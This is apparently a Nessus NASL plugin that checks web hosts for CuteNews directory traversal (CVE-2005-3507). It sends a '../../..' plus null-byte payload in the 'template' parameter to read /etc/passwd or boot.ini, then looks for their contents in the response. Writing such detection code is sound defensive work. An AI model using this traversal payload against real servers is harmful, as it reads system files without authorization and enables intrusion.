#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: retrogod at aliceposta.it
#
# This script is released under the GNU GPL v2
#
# Changes by Tenable:
# - Revised plugin title (12/23/2008)


include("compat.inc");

if(description)
{
  script_id(20137);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-3507");
  script_bugtraq_id(15295);
  script_xref(name:"OSVDB", value:"20472");
  script_xref(name:"OSVDB", value:"20473");
  script_xref(name:"OSVDB", value:"20474");
  
  script_name(english:"CuteNews Multiple Script Traversal Privilege Escalation");

 script_set_attribute(attribute:"synopsis", value:
"The remote web site contains a PHP application that is affected by a
directory traversal flaw." );
 script_set_attribute(attribute:"description", value:
"The version of CuteNews installed on the remote host fails to sanitize
input to the 'template' parameter of the 'show_archives.php' and
'show_news.php' scripts.  An attacker can exploit this issue to read
arbitrary files and possibly even execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/cute141.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

  script_summary(english:"Checks for CuteNews dir traversal");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
  script_dependencie("cutenews_detect.nasl");  
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#the code

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

install_dir = get_kb_item(string("www/", port, "/cutenews"));
if (isnull(install_dir)) exit(0);
matches = eregmatch(string:install_dir, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
   loc=matches[2];
   foreach file (make_list("etc/passwd", "boot.ini"))
   {
       req = http_get(item:string(loc, "/show_archives.php?template=../../../../../../../../../", file, "%00"), port:port);
       res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
       if(res == NULL) exit(0);
       if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string:res)){
              security_hole(port);
              exit(0);
       }
   }
}
